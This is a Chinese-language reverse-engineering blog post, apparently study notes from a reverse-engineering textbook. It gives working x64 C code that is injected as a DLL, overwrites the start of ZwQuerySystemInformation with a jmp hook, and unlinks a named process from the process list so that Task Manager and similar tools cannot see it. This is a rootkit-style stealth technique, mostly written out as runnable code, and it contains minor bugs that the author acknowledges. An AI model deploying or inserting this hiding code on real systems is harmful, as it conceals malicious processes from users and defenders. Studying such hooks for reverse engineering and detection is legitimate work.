**摘要**

技术摘要：

动态修改进程内存中的代码。利用DLL注入修改代码开头跳转到补丁代码。

起源是逆向工程核心原理里面以任务管理器ZwQuerySystemInformation()API钩取为例讲解利用dll注入修改api的起始代码为jmp实现api钩取。  
该例子目标是隐藏某个进程。

大概流程如下

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
调用者:1: call apiapi:2: jmp patchpatch:3: unhook4: call api（正常执行api功能）5: hook6: patch7: retn 到调用者
```

  

  

**细节**

有一些未公开的函数或者枚举类型一定要找尽可能正确的。可能因为资料的不正确导致钩取失败或没有效果。如果出现问题，要对比正常流程看钩取后传递的参数是否符合预期，一些标志位的设置是否正确。

不可避免的一个问题是会出现漏网之鱼，也就unhook期间原api被调用会暴露隐藏进程。我在测试时遇到过隐藏进程突然在任务管理器中闪出来几下的情况。

隐藏进程实际上是修改了ZwQuerySystemInformation返回的一个包含进程信息的链表，如果要隐藏的进程在链表中排第一个的话会出错，原因详见 实例 中。而实际中似乎链表的第一个一定是System(进程号为4)，随后是Registry和svchost。所以只有不隐藏System这个进程就不会有问题。

  

  

  

  

实例  

  

隐藏进程ZwQuerySystemInformation()（x64）

  

该例子对象是任何直接或间接使用了ZwQuerySystemInformation查询进程信息的64位程序，比如任务管理器。

#pragma comment(linker, "/SECTION:.SHARE,RWS")#pragma data_seg(".SHARE")wchar_t g_wszProcName[MAX_PATH] = { 0, };#pragma data_seg()
void SetProcName(LPCTSTR wszProcName){    wcscpy_s(g_wszProcName, wszProcName);}
BOOL APIENTRY DllMain(HMODULE hModule,    DWORD  ul_reason_for_call,    LPVOID lpReserved){    char pszCurProc[MAX_PATH] = { 0, };    char* p = NULL;
    // check    GetModuleFileNameA(NULL, pszCurProc, MAX_PATH);    p = strrchr(pszCurProc, '\\');    if ((p != NULL) && !_stricmp(p + 1, "remote_inject_x64.exe"))        return TRUE;
    switch (ul_reason_for_call) {    case DLL_PROCESS_ATTACH:        // set        SetProcName(L"notepad.exe");        // get api        hApi = GetProcAddress(GetModuleHandleW(pwszDllName), "ZwQuerySystemInformation");        // hook        hook_by_5b_code(pszDllName, hApi, (PROC)MyZwQuerySystemInformation);        break;    case DLL_PROCESS_DETACH:        //unhook        unhook_by_5b_code(pszDllName, hApi);        break;    }    return TRUE;}
```

这里就是普通的dll，加载时钩取、卸载时脱钩。在加载时还会获取目标api的地址，以及设置要隐藏的dll名称。设置隐藏dll名称这一步可以换到别的地方设置。因为保存隐藏dll名称的变量是个共享变量，所以完全可以再写一个程序复制管理这个共享变量。只需要在管理程序中主动加载该dll，然后调用导出的SetProcName()即可，可以实现动态改变隐藏目标。当然也可以拓展代码实现隐藏多个不同名进程或按pid隐藏等。（这里SetProcName定义在dll的头文件中）

  

**3 hook by 5bytes code**

hook\_by\_5b\_code函数修改api开头的5字节内容，改成jmp指令。32和64的jmp都是e9+4字节的相对偏移，这个相对偏移是以jmp下一条指令的地址作为起始地址来计算的，具体见下面的代码。

```
bool hook_by_5b_code(char* pszDllName, HANDLE api, PROC newApi){    DWORD dwOldProtect;    byte pNewBytes[5] = { 0xE9, 0, };    DWORD jmpOffset;
    VirtualProtect(api, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    if (((PBYTE)api)[0] == 0xE9)        return false;
    // bak origin byte    memcpy(pOriginBytes, api, 5);
    // count jmp offset    jmpOffset = (DWORD)((size_t)newApi - (size_t)api - 5);
    // e9 offset(4bytes)    memcpy(&pNewBytes[1], &jmpOffset, 4);
    // hook    memcpy(api, pNewBytes, 5);
    VirtualProtect(api, 9, dwOldProtect, &dwOldProtect);
    return true;}
```

unhook就是恢复api原始字节即可。

bool unhook_by_5b_code(char* pszDllName, HANDLE api){    DWORD dwOldProtect;
    VirtualProtect(api, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    if (((PBYTE)api)[0] != 0xE9)        return false;
    // unhook    memcpy(api, pOriginBytes, 5);
    VirtualProtect(api, 5, dwOldProtect, &dwOldProtect);
    return true;}
```

**补丁代码 **

**(ZwQuerySystemInformation）**

1~4对应摘要中的3~6，具体看代码及注释。在执行patch之前会检测返回值判断调用原api是否成功，以及判断此次调用是否为查询进程信息。

PSYSTEM\_PROCESS\_INFORMATION结构是一个链表，具体遍历方式参考代码即可。

SYSTEM\_INFORMATION\_CLASS是一个枚举类型，说明函数SystemInformation这个参数的类似是什么。如果 SystemInformationClass == SystemProcessorInformation(5) 即代表SystemInformation类型为PSYSTEM\_PROCESS\_INFORMATION。

可以看到代码中没有对链表第一个元素做特殊处理，这里算是一个不会产生太大影响的bug。如果要隐藏的进程在链表的第一个位置，此时prev和cur指向的都是第一个元素，执行操作以后会错误修改第一个元素的next偏移，导致无法正确找到第二个元素，同时也没有隐藏第一个。实际中第一个元素好像一般为System进程，只要不隐藏这个一般不会触发问题。

NTSTATUS WINAPI MyZwQuerySystemInformation(    _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,    _Inout_   PVOID                    SystemInformation,    _In_      ULONG                    SystemInformationLength,    _Out_opt_ PULONG                   ReturnLength){    NTSTATUS nts;
    // 1: unhook    unhook_by_5b_code(pszDllName, hApi);
    // 2: call origin api    nts = ((ZwQuerySystemInformation)hApi)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    // 3: hook    hook_by_5b_code(pszDllName, hApi, (PROC)MyZwQuerySystemInformation);
    // SystemProcessorInformation(5)    if ((nts != CMC_STATUS_SUCCESS) || SystemInformationClass != 5) {        return nts;    }
    // 4: patch: hide    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;    pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;    pPrev = pCur; // warning    while (1) {        // hide        if (pCur->Reserved2[1] != NULL) {            if (_wcsicmp((PWSTR)pCur->Reserved2[1], g_wszProcName) == 0) {                if (pCur->NextEntryOffset == 0)                    pPrev->NextEntryOffset = 0;                else                    pPrev->NextEntryOffset += pCur->NextEntryOffset;            }            else {                pPrev = pCur;            }        }
        // break        if (pCur->NextEntryOffset == 0)            break;
        // next        pCur = (PSYSTEM_PROCESS_INFORMATION)((size_t)pCur + (size_t)pCur->NextEntryOffset);    }        return nts;}
